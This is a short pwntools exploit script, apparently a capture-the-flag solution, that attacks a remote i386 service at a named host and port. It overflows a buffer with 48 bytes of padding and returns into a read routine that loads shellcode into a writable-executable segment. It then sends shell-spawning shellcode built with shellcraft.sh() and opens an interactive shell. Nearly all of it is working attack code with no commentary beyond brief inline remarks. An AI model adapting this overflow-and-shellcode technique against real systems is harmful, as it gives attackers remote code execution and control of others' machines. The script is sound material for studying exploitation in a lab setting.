from pwn import *

context(arch='i386')

rwx = 0x08049000
read = 0x080480FD

rep = 48

bin_sh = asm(shellcraft.sh())

io = remote("pwn1.0ops.sjtu.cn", 10004)

io.sendline(
    b"A" * rep 
    + p32(read) # return to read
    + p32(rwx)  # oriented to rwx segment
    + p32(0x0)
    + p32(rwx)  # store into RWX segment
    + p32(len(bin_sh))
)

io.sendline(bin_sh)

io.interactive()